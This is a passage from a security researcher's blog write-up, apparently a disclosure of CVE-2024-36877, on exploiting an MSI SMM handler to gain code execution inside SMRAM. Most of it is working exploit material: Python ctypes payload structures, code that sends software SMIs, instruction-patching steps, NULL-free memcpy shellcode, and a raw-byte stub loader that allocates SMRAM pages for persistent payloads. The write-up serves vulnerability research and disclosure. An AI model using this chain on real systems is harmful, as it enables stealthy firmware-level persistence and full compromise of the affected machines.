<p><code class="language-plaintext highlighter-rouge">SMM_Code_Chk_En</code> is a CPU security feature that prevents code-execution from leaving SMRAM (an SMM callout). When enabled, the CPU will lock if an instruction calls a non-SMRAM address.</p>

<p>My first thought is that I would be able to find an instruction where updating its address from, letâs say <code class="language-plaintext highlighter-rouge">call 0xFEEDBEEF</code> to <code class="language-plaintext highlighter-rouge">call 0xFEED2000</code> could work in my favor. With <code class="language-plaintext highlighter-rouge">SMM_Code_Chk_En</code>, a lot of conditions have to be met for that to work:</p>

<ul>
  <li>0xFEED2000 is in SMRAM</li>
  <li>I have to be able to write shellcode to 0xFEED2000</li>
  <li>I have to be able to call the function that calls 0xFEED2000 (via an SMI handler, or other method)</li>
</ul>

<p>These conditions didnât exist, or at least, I couldnât find a good candidate. As such, just being able to write <code class="language-plaintext highlighter-rouge">0x20 0x00</code> anywhere was less than ideal.</p>

<p>Instead, I decided to leverage the <code class="language-plaintext highlighter-rouge">GetVariable</code> overflow to write my own data, which I can then pass to <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code>.</p>

<h5 id="building-a-better-write-primitive">Building A Better Write Primitive</h5>

<p>If you recall, <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code> prepends all its writes with a wide space:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fnWriteStatusToMemory("my_shellcode", 0xFEEDBEEF);
</code></pre></div></div>

<p>Results in â my_shellcodeâ being written to 0xFEEDBEEF.</p>

<p>Having <code class="language-plaintext highlighter-rouge">0x20 0x00</code> prepended to every write really limits the options on what can be written and where. And certainly no working shellcode (0x20 0x00 is not a valid instruction). That needs to be disabled.</p>

<p>Here is the assembly for the vulnerabile SMI handler, prior to it calling <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 8D 51 79            lea     rdx, [rcx+79h]
48 8D 0D 0D 0F 00 00   lea     rcx, aAccessDenied ; "Access denied"
E8 68 EF FF            call    fnWriteStatusToMemory
</code></pre></div></div>

<p>Using the <code class="language-plaintext highlighter-rouge">0x20 0x00</code> primitive, I turn</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 8D 0D 0D 0F 00 00   lea     rcx, aAccessDenied ; "Access denied"
</code></pre></div></div>

<p>into:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 8D 0D 0D [20 00] 00   lea     rcx, byte_4AA356D8
</code></pre></div></div>

<p>I do this now because I need a way to disable the writing of the wide-byte portion of <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code> and will need this functionality later.</p>

<p>Now, anything at address <code class="language-plaintext highlighter-rouge">0x4AA356D8</code> will be written (as a wide string) to <code class="language-plaintext highlighter-rouge">pWMIAcpiMemAddr-&gt;status</code>. Luckily, <strong>0x4AA356D8</strong> is lower in memory than <strong>0x4AA34710</strong> (the address of pWMIAcpiMemAddr).</p>

<p>Overflowing the <code class="language-plaintext highlighter-rouge">WMIACPIMemAddress</code> variable, I can set 0x4AA356D8 to whatever value I need by adjusting the WMIPayload struct I used previously:</p>

<p><em>0x4AA356D8 - 0x4AA34710 (address of pWMIAcpiMemAddr) = <strong>0xFC8</strong></em></p>

<p>The new WMIPayload struct:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class WMIPayload(ctypes.LittleEndianStructure):
  _pack_ = 1
  _fields_ = [
    ("WmiACPIMemAddress", ctypes.c_uint64),        # 0x0000
    ("WmiACPIMemAddressCpy", ctypes.c_uint64),     # 0x0008
    ("pad_0010", ctypes.c_char * 24),              # 0x0010
    ("gSMST_0", ctypes.c_uint64),                  # 0x0028
    ("pad_0030", ctypes.c_char * 40),              # 0x0030
    ("InSmram", ctypes.c_uint64),                  # 0x0058
    ("gSMRT", ctypes.c_uint64),                    # 0x0060
    ("gSMST_1", ctypes.c_uint64),                  # 0x0068
    ("pad_0070", ctypes.c_char * 3928),            # 0x0070 // 3928 byte padding
    ("Primitive", ctypes.c_byte * 8),              # 0x0FC8 // 0x4AA356D8
  ]
</code></pre></div></div>

<p>There is a caveatâstomping over 0xFC8 bytes starting at the address of <code class="language-plaintext highlighter-rouge">pWMIAcpiMemAddr</code> means I overwrite one really important pointerâ<code class="language-plaintext highlighter-rouge">gRT</code> (the SMRAM version of runtime services)âwhich is called at the beginning of the SMI handler (<code class="language-plaintext highlighter-rouge">gRT-&gt;GetVariable</code>). Unfortunately, this pointer isnât leaked anywhere, and so it has to be hard-coded for each BIOS version (itâs static). I canât change the <code class="language-plaintext highlighter-rouge">gRT-&gt;GetVariable</code> call either, as itâs needed for future steps during the chain. A read-primitive vulnerability would be needed to make this universal; for the POC though, hard-coding the pointer will work just fine.</p>

<p>Here is the assembly for <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5D               	  pop     rbp   // byte 1
C3               	  retn          // byte 2
                 	  ; end of sub_4AA32368
                    ; fnWriteStatusToMemory start
B8 20 00 00 00   	  mov     eax, 20h ; ' '
45 32 C9         	  xor     r9b, r9b
66 89 02         	  mov     [rdx], ax
8A 01            	  mov     al, [rcx]
84 C0            	  test    al, al
74 1B            	  jz      short locret_4AA32664
45 33 C0         	  xor     r8d, r8d
                 	  loc_4AA3264C:
0F BE C0         	  movsx   eax, al
41 FE C1         	  inc     r9b
66 42 89 44 42 02	  mov     [rdx+r8*2+2], ax
45 0F B6 C1      	  movzx   r8d, r9b
41 8A 04 08      	  mov     al, [r8+rcx]
84 C0            	  test    al, al
75 E8            	  jnz     short loc_4AA3264C
                 	  locret_4AA32664:
C3               	  retn
                    ; g_WriteStatusMsg endp
</code></pre></div></div>

<p>I show the previous function prologue because those last two bytes are going to get replaced when I disable the writing of the wide-byte space. Good news is the function (<code class="language-plaintext highlighter-rouge">sub_4AA32368</code>) never gets called, so it doesnât impact anything important.</p>

<p>Two changes need to be made to stop 0x20 from ruining my hopes and dreams of SMM exploitation:</p>

<p>Line 1 at the top of the function:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>B8 20 00 00 00   mov     eax, 20h ; ' '
</code></pre></div></div>

<p>and line 3:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>66 89 02         mov     [rdx], ax
</code></pre></div></div>

<p>These two are responsible for moving 0x20 into RAX and then writing it as a wide byte.</p>

<p>It would be great if I could write NOPs over the two and be done with it, but no matter what, <code class="language-plaintext highlighter-rouge">mov     [rdx], ax</code> will always ensure the last byte either 0x00 or 0xFF, which will lead to the instruction looking something like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>90 90 90 90 FF  ; invalid instruction, crash imminent
</code></pre></div></div>

<p>Is there another NOP-like byte I can use ?</p>

<p>Yes, actually. Meet my new friend <code class="language-plaintext highlighter-rouge">0x66</code>: the operand-size override prefix.</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def gen_bad_var_data(self, wmi_memaddr=None, write_primitive=None):
  wmipayload = self.WMIPayload()

  wmipayload.gSMRT = self.SMRT # needs to be hardcoded
  wmipayload.gSMST_0 = self.SMST # this pointer is leaked
  wmipayload.gSMST_1 = self.SMST # same
  wmipayload.InSmram = 1

  if wmi_memaddr is not None:
    wmipayload.WmiACPIMemAddress = wmi_memaddr - 0x79
    wmipayload.WmiACPIMemAddressCpy = wmi_memaddr - 0x79

  if write_primitive is not None:
    wmipayload.Primitive = (ctypes.c_byte * 8)(*write_primitive)

  return wmipayload

def disable_0x20(self):
  primitive = b"\x66\x00\x00\x00\x00\x00\x00"

  data = self.gen_bad_var_data(
      wmi_memaddr=self.MovEax20Address, # mov     eax, 20h ; ' '
      write_primitive=primitive,
  )

  self.set_wmi_var(data)

  self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
</code></pre></div></div>
<p>The original:</p>

<p><code class="language-plaintext highlighter-rouge">B8 20 00 00 00   mov     eax, 20h ; ' '</code></p>

<p>now turns into:</p>

<p><code class="language-plaintext highlighter-rouge">66 00 00 00 00   data16 add BYTE PTR [rax],al</code></p>

<p>Do I have any idea whatâs in RAX when this function is first called? No, because debugging doesnât exist in SMM mode unless you sign a corporate NDA with Intel (<em>btw, Intel, hook a brother up</em>). But it doesnât crash and zeroes out RAX, which is all that matters.</p>

<p>Moving on to disabling line 3:</p>

<p><code class="language-plaintext highlighter-rouge">66 89 02         mov     [rdx], ax</code></p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def disable_0x20(self):
    primitive = b"\x66\x00\x00\x00\x00\x00\x00"

    data = self.gen_bad_var_data(
        wmi_memaddr=self.MovEax20Address, # mov     eax, 20h ; ' '
        write_primitive=primitive,
    )

    self.set_wmi_var(data)

    self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)

    # nothing other than 0x0 0x00 will be written with this set to null
    primitive = b"\x00\x00\x00\x00\x00\x00\x00"

    data = self.gen_bad_var_data(
        wmi_memaddr=self.MovRdxAxAddress, # mov [rdx], ax
        write_primitive=primitive,
    )

    self.set_wmi_var(data)

    self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
</code></pre></div></div>

<p>With RAX set to 0x0, I use the same trick, but this time, 0x66 is already in place, so I just need two 0x0 bytesâwhich I just happen to have already in RAX from the last step:</p>

<p><code class="language-plaintext highlighter-rouge">66 89 02         mov     [rdx], ax</code></p>

<p>becomes:</p>

<p><code class="language-plaintext highlighter-rouge">66 00 00         data16 add BYTE PTR [rax],al</code></p>

<p>And with that, the function will no longer write <code class="language-plaintext highlighter-rouge">0x20 0x00</code> at the start of <code class="language-plaintext highlighter-rouge">DestAddress</code> - putting me one step closer the finish line. I simply need to take into consideration that the function begins writing whatever data I want at +0x2 bytes from my target address (so, target-0x79-0x2).</p>

<p>To recap whatâs been changed so far:</p>

<ul>
  <li>âAccess Deniedâ was zeroâd out in the moduleâs <code class="language-plaintext highlighter-rouge">.data</code> segment, allowing for a two byte (0x20 0x00 write primitive)</li>
  <li>Using the 0x20 0x00 primitive, the address of the first parameter passed to <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code> was updated - there now exists a way to write any byte(s) at an attacker controlled address to another address (albeit as a wide byte)</li>
  <li>Using the new primitive above, <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code> was modified so that <code class="language-plaintext highlighter-rouge">0x20 0x00</code> is no longer prepended to the first parameter when the function is called</li>
</ul>

<p>A few more changes need to be made to have a true write-where primitive, but the exploit is almost done!</p>

<h5 id="a-real-memcpy-please">A Real Memcpy, Please!</h5>

<p>A limitation exists with <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code> and its write capabilities: it stops looping when it encounters <code class="language-plaintext highlighter-rouge">0x0</code> since itâs purpose was to copy a stringâ¦ and that just wonât do.</p>

<p>But, if I can write memcpy-esque shellcode that has no 0x0 bytes, then Iâm one step closer to firmware persistence.</p>

<p>Remember, I control RCX when <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code> is called, so only a little more creativity is needed.</p>

<p>Hereâs what I cooked up:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:  48 8b 01                mov    rax,QWORD PTR [rcx]
3:  48 8b 30                mov    rsi,QWORD PTR [rax]
6:  48 8b 78 08             mov    rdi,QWORD PTR [rax+0x8]
a:  8b 48 10                mov    ecx,DWORD PTR [rax+0x10]
d:  f3 a4                   rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
f:  b0 01                   mov    al,0x1
11: c3                      ret 
</code></pre></div></div>

<p>The function expects RCX to hold an address to a struct defined as:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class CopyMem(ctypes.Structure):
    _fields_ = [
        ("source", ctypes.c_void_p),  # void* source
        ("dest", ctypes.c_void_p),  # void* dest
        ("size", ctypes.c_uint32),  # unsigned int size
    ]
</code></pre></div></div>

<p><strong><em>fnWriteStatusToMemory</em></strong> even with the existing changes, still writes bytes as wide, which means two bytes will get changed everytime a write occurs.</p>

<p>The instruction responsible for this in <strong><em>fnWriteStatusToMemory</em></strong>:</p>

<p><code class="language-plaintext highlighter-rouge">movsx eax, al</code></p>

<p>When a byte &gt; 0x7F (letâs say 0xEA) is passed to <strong><em>fnWriteStatusToMemory</em></strong>, it writes <code class="language-plaintext highlighter-rouge">0xEA 0xFF</code> instead of <code class="language-plaintext highlighter-rouge">0xEA 0x00</code>.</p>

<p>This is because the instruction sign-extends the value in <code class="language-plaintext highlighter-rouge">al</code> to <code class="language-plaintext highlighter-rouge">EAX</code>. If <code class="language-plaintext highlighter-rouge">al</code> contains a value greater than 0x7F, then it is treated as a negative value when considered as a signed byte.</p>

<p>So while <strong><em>fnWriteStatusToMemory</em></strong> still writes wide-bytes, itâs the perfect piece to the puzzle :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>E8 68 EF FF FF     call    fnWriteStatusToMemory
</code></pre></div></div>

<p>can now become:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>E8 68 [EA FF] FF   call    near ptr unk_4AA32138
</code></pre></div></div>

<p>Whatâs at 0x4AA32138? Nothing important! (except a sweet ROP gadget, but since I donât have the ability to debug in SMM this one is worthless).</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>44 0F 6F 89 88 00 00 00                movq    mm1, qword ptr [rcx+88h]
F3 44 0F 6F 91 98 00 00 00             movdqu  xmm10, xmmword ptr [rcx+98h]
F3 44 0F 6F 99 A8 00 00 00             movdqu  xmm11, xmmword ptr [rcx+0A8h]
F3 44 0F 6F A1 B8 00 00 00             movdqu  xmm12, xmmword ptr [rcx+0B8h]
F3 44 0F 6F A9 C8 00 00 00             movdqu  xmm13, xmmword ptr [rcx+0C8h]
F3 44 0F 6F B1 D8 00 00 00             movdqu  xmm14, xmmword ptr [rcx+0D8h]
F3 44 0F 6F B9 E8 00 00 00             movdqu  xmm15, xmmword ptr [rcx+0E8h]
48 89 D0                               mov     rax, rdx
FF 61 48                               jmp     qword ptr [rcx+48h]
</code></pre></div></div>

<p>Plenty of room for the memcpy shellcode to go!</p>

<p>First I copy the shellcode to 0x4AA32138:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def copy_memcpy(self):
    for idx, b in enumerate(Shellcode.MEM_COPY):
        primitive = b + b"\x00\x00\x00\x00\x00\x00\x00"
        data = self.gen_bad_var_data(
            wmi_memaddr=0x4AA32138
            - 0x2
            + idx,
            write_primitive=primitive,
        )
        self.set_wmi_var(data)
        self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
        time.sleep(0.200)
</code></pre></div></div>

<p>Now I redirect the call to <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code> to <strong>0x4AA32138</strong> by writing <code class="language-plaintext highlighter-rouge">0xEA 0xFF</code> to <em>0x4AA415A3</em>:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def patch_call_addr(self):
    primitive = b"\xEA\x00\x00\x00\x00\x00\x00"
    data = self.gen_bad_var_data(
        wmi_memaddr=0x04AA415A3
        + 0x2   # yes, i know
        - 0x2,  # .text:000000004AA415A3 E8 68 EF FF FF =&gt; E8 68 EA FF FF
        write_primitive=primitive,
    )
    self.set_wmi_var(data)

    self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
</code></pre></div></div>

<p>The last step is to once again overflow the global variable and this time, instead of setting <code class="language-plaintext highlighter-rouge">0x4AA356D8</code> to a byte, I set it to the physical address containing the <code class="language-plaintext highlighter-rouge">CopyMem()</code> struct:</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def copy_mem(self, source, dest, size):
    payload_address = 0x500 # any physical address with write access will do
    copy_payload = self.CopyMem()

    copy_payload.source = ctypes.c_void_p(source)
    copy_payload.dest = ctypes.c_void_p(dest)
    copy_payload.size = size

    self.cs.helper.write_phys_mem(
        payload_address, ctypes.sizeof(copy_payload), bytes(copy_payload)
    )

    primitive = payload_address.to_bytes(8, "little")

    data = self.gen_bad_var_data(write_primitive=primitive)
    self.set_wmi_var(data)

    self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
</code></pre></div></div>

<p>The hard part is over! I can now copy data in and out of SMRAM without limitations.</p>

<p>One last recap of whatâs been done:</p>

<ul>
  <li>âAccess Deniedâ was zeroâd out in the moduleâs <code class="language-plaintext highlighter-rouge">.data</code> segment, allowing for a two byte (0x20 0x00 write primitive)</li>
  <li>Using the 0x20 0x00 primitive, the address of the first parameter passed to <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code> was updated - there now exists a way to write any byte(s) at an attacker controlled address to another address (albeit as a wide byte)</li>
  <li>Using the new primitive above, <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code> was modified so that <code class="language-plaintext highlighter-rouge">0x20 0x00</code> is no longer prepended to the first parameter when the function is called</li>
  <li>memcpy shellcode that contains no NULL bytes is written to 0x4AA32138</li>
  <li>The instruction which calls <code class="language-plaintext highlighter-rouge">fnWriteStatusToMemory</code> is updated to call 0x4AA32138</li>
  <li>A src/dest/size struct is written to a writable phyisical address</li>
  <li>SMI handler is called, overflowing the variable and writing the structâs address to the .data segment</li>
  <li>Handler execution flow is redirected to the memcpy shellcode, the memcpy struct is passed as RCX</li>
  <li>Shellcode executes and performs memcpy</li>
</ul>

<h5 id="post-exploitation">Post Exploitation</h5>

<p>Iâve defiled enough of MSIApServiceSmiâs code - getting my own SMRAM pages would be great so that bigger payloads can be written to perform more complex work, without worrying about overwriting something important. I also prefer not to continue having to set a UEFI variable each time I want to do anything.</p>

<h5 id="meet-stub-loader">Meet Stub Loader</h5>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__int64 stub_loader(void)
{
  PCONFIG c = (PCONFIG)(0x600);

  if (!c-&gt;CommBuffer)
  {
    return -1;
  }

  if (c-&gt;DispatchFunction)
  {
    typedef void(__stdcall* tDispatch)(PCONFIG);

    tDispatch dispatch = (tDispatch)c-&gt;DispatchFunction;
    dispatch(c); 
    return -1;
  }

  if (!c-&gt;DispatchFunction)
  {
    c-&gt;CommBuffer-&gt;ret = 0xFF;

    if (!c-&gt;CommBuffer-&gt;source || c-&gt;CommBuffer-&gt;size &lt; 1)
    {
      c-&gt;CommBuffer-&gt;ret = 0xFE;
      return -1;
    }

    if (!c-&gt;SMST)
    {
      c-&gt;CommBuffer-&gt;ret = 0xFD;
      return -1;
    }

    UINT64 dispatch = 0;
    EFI_STATUS ret = 0;

    if (!c-&gt;SMST-&gt;SmmAllocatePages(__AllocateAnyPages, __EfiRuntimeServicesCode, 1, &amp;dispatch))
    {
      c-&gt;DispatchFunction = dispatch;
      unsigned char* destination = (unsigned char*)c-&gt;DispatchFunction;
      for (int len = 0; len &lt; c-&gt;CommBuffer-&gt;size; len++)
        destination[len] = ((unsigned char*)c-&gt;CommBuffer-&gt;source)[len];

      c-&gt;CommBuffer-&gt;ret = 0x0;

      return -1;
    }
    else
    {
      c-&gt;CommBuffer-&gt;ret = 0xEE;
    }
  }
  return -1;
}
</code></pre></div></div>

<p>The stub loader will read a struct at a static memory address (0x600).</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef enum _ACTION {
  COPY_RAW_MEM = 0x1,
  ALLOCATE_COPY_DATA,
  ALLOCATE_COPY_EXECUTE,
  MAP_SMM_MODULE,
  UNMAP_SMM_MODULE,
  SMM_MODULE_EXEC,
  CALL,
  DISABLE_WP,
  ENABLE_WP,
  RESERVED1,
  RESERVED2,
  RESERVED3,
  PING = 0xF
} ACTION;

#pragma pack(push, 1)
typedef struct _COMBUFF {
  void* source;
  void* dest;
  unsigned int size;
  unsigned long long status;
  unsigned int action;
} COMBUFF, * PCOMBUFF;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct _CONFIG {
  PCOMBUFF CommBuffer; # (say, 0x700)
  __EFI_SMM_SYSTEM_TABLE2* SMST;
  UINT64 SMRT;
  UINT64 SMBase;
  UINT64 DispatchFunction;
  UINT64 MemCpy;
  UINT64 NativeExecute;
  ...
} CONFIG, * PCONFIG;
#pragma pack(pop)
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">CONFIG</code> struct provides a way for a kernel driver (or Python script) to interact with the code in SMM. It also passes a pointer to SMST, allowing the stub to use the native edk2 function to allocate pages.</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>STUB_LOADER = [
        b'\x40', b'\x57', b'\x48', b'\x83', b'\xEC', b'\x20', b'\xBF', b'\x00',
        b'\x05', b'\x00', b'\x00', b'\x48', b'\x8B', b'\x07', b'\x48', b'\x85',
        b'\xC0', b'\x0F', b'\x84', b'\xC0', b'\x00', b'\x00', b'\x00', b'\x48',
        b'\x8B', b'\x14', b'\x25', b'\x20', b'\x05', b'\x00', b'\x00', b'\x48',
        b'\x85', b'\xD2', b'\x74', b'\x09', b'\x8B', b'\xCF', b'\xFF', b'\xD2',
        b'\xE9', b'\xAA', b'\x00', b'\x00', b'\x00', b'\x48', b'\xC7', b'\x40',
        b'\x14', b'\xFF', b'\x00', b'\x00', b'\x00', b'\x48', b'\x8B', b'\x07',
        b'\x48', b'\x83', b'\x38', b'\x00', b'\x0F', b'\x84', b'\x8D', b'\x00',
        b'\x00', b'\x00', b'\x83', b'\x78', b'\x10', b'\x01', b'\x0F', b'\x82',
        b'\x83', b'\x00', b'\x00', b'\x00', b'\x4C', b'\x8B', b'\x14', b'\x25',
        b'\x08', b'\x05', b'\x00', b'\x00', b'\x4D', b'\x85', b'\xD2', b'\x75',
        b'\x0A', b'\x48', b'\xC7', b'\x40', b'\x14', b'\xFD', b'\x00', b'\x00',
        b'\x00', b'\xEB', b'\x74', b'\x48', b'\x83', b'\x64', b'\x24', b'\x30',
        b'\x00', b'\x4C', b'\x8D', b'\x4C', b'\x24', b'\x30', b'\xBA', b'\x05',
        b'\x00', b'\x00', b'\x00', b'\x33', b'\xC9', b'\x44', b'\x8D', b'\x42',
        b'\xFC', b'\x41', b'\xFF', b'\x52', b'\x60', b'\x48', b'\x8B', b'\x0C',
        b'\x25', b'\x00', b'\x05', b'\x00', b'\x00', b'\x48', b'\x85', b'\xC0',
        b'\x75', b'\x3B', b'\x4C', b'\x8B', b'\x4C', b'\x24', b'\x30', b'\x45',
        b'\x33', b'\xC0', b'\x4C', b'\x89', b'\x0C', b'\x25', b'\x20', b'\x05',
        b'\x00', b'\x00', b'\x44', b'\x39', b'\x41', b'\x10', b'\x76', b'\x1B',
        b'\x33', b'\xD2', b'\x48', b'\x8B', b'\x01', b'\x41', b'\xFF', b'\xC0',
        b'\x8A', b'\x0C', b'\x02', b'\x41', b'\x88', b'\x0C', b'\x11', b'\x48',
        b'\xFF', b'\xC2', b'\x48', b'\x8B', b'\x0F', b'\x44', b'\x3B', b'\x41',
        b'\x10', b'\x72', b'\xE7', b'\x48', b'\x8B', b'\x07', b'\x48', b'\x83',
        b'\x60', b'\x14', b'\x00', b'\xEB', b'\x12', b'\x48', b'\xC7', b'\x41',
        b'\x14', b'\xEE', b'\x00', b'\x00', b'\x00', b'\xEB', b'\x08', b'\x48',
        b'\xC7', b'\x40', b'\x14', b'\xFE', b'\x00', b'\x00', b'\x00', b'\x48',
        b'\x83', b'\xC8', b'\xFF', b'\x48', b'\x83', b'\xC4', b'\x20', b'\x5F',
        b'\xC3', b'\xCC', b'\xCC', b'\xCC',
    ]
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">stub_loader</code> only has one job: allocate pages in SMRAM and copy the contents of <code class="language-plaintext highlighter-rouge">CommBuffer-&gt;source</code> to the new page. It then saves the newly allocated page address to <code class="language-plaintext highlighter-rouge">Config-&gt;DispatchFunction</code> and calls that address for all other subsequent SW SMIs. It always returns -1, which causes the vulnerable SMI handler to exit without running any other code.</p>

<p>I use my new memcpy code to write the <code class="language-plaintext highlighter-rouge">stub_loader</code> shellcode over <code class="language-plaintext highlighter-rouge">g_SetVarPtrs</code> address (see the very top for the SMI handler pseudocode if you missed it). This way, no call bytecode has to be modified.</p>

<div class="example">
</div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def copy_stub_loader(self):
    shellcode_size = len(Shellcode.STUB_LOADER)
    self.cs.helper.write_phys_mem(self.ShellCodeBufferAddress, shellcode_size, b''.join(Shellcode.STUB_LOADER))

    combuffer = COMBUFF()
    combuffer.source = self.ShellCodeBufferAddress
    combuffer.size = shellcode_size
    combuffer.dest = self.StubAddress #g_SetVarPtrs

    self.cs.helper.write_phys_mem(
            self.ComBuffAddress, ctypes.sizeof(COMBUFF), bytes(combuffer))

    config = self.gen_config()

    self.cs.helper.write_phys_mem(
            self.ConfigAddress, ctypes.sizeof(CONFIG), bytes(config))

    print("Config written to " + hex(self.ConfigAddress))
    print("Commbuffer @ " + hex(self.ComBuffAddress))
    print("Stub loader shellcode @ " + hex(self.ShellCodeBufferAddress))
    print("Stomping all over " + hex(self.StubAddress))

    primitive = self.ComBuffAddress.to_bytes(8, "little") # essentially the same as CopyMem()
    data = self.gen_bad_var_data(write_primitive=primitive)

    self.set_wmi_var(data)

    self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
</code></pre></div></div>

<p>The next SMI call will now call <code class="language-plaintext highlighter-rouge">stub_loader</code> instead, which will then kick off page allocation and perform the final shellcode copy. And thatâs it! No more having to set UEFI variables or fighting with wide bytes.</p>

<h2 id="the-poc">The POC</h2>
<p>Find the POC (in kernel driver form) on <a href="https://github.com/jjensn/CVE-2024-36877">GitHub</a>.</p>


						</div><!-- /.content -->
					</div><!-- /.col -->
					<div class="col-md-3 col-md-offset-1">
						<div class="sections-list-wrapper">
							<div class="sections-list js-sections js-affix js-scrollspy hidden-xs hidden-sm"></div><!-- /.sections-list -->
						</div>
					</div><!-- /.col -->
				</div><!-- /.row -->
			</div><!-- /.container -->
		</div><!-- /.section -->
		
		<div class="js-footer-area">
			
			
			
	<footer class="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-sm-6">
					
						<a href="/" class="site-footer__logo">jjensn.com</a>
					
					
						<hr>
						<p class="site-footer__copyright">always open for new opportunities! hire (a)t jjensn.com</p>
					
				</div><!-- /.col -->
				
					<div class="col-sm-6 align-right">
						<ul class="social-list">
							
								<li>
									<a href="https://github.com/jjensn" target="_blank" class="social-list__item social-list__item--github">
										<i class="icon icon--github"></i>
									</a>
								</li>
							
						</ul><!-- /.social-list -->
					</div><!-- /.col -->
				
			</div><!-- /.row -->
		</div><!-- /.container -->
	</footer><!-- /.site-footer -->


<script src="/doks-theme/assets/js/vendor/jquery.min.js"></script>
<script type="text/javascript" src="/doks-theme/assets/js/vendor/bootstrap/affix.min.js"></script>
<script type="text/javascript" src="/doks-theme/assets/js/vendor/bootstrap/scrollspy.min.js"></script>
<script type="text/javascript" src="/doks-theme/assets/js/vendor/matchHeight.min.js"></script>
<script type="text/javascript" src="/doks-theme/assets/js/scripts.min.js"></script>




		</div><!-- /.js-footer-area -->
	<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8ffc71a65b2c6437","version":"2024.10.5","r":1,"serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"d20c5ad02ce846269c921e2ae520e5a5","b":1}' crossorigin="anonymous"></script>
</body>
</html>
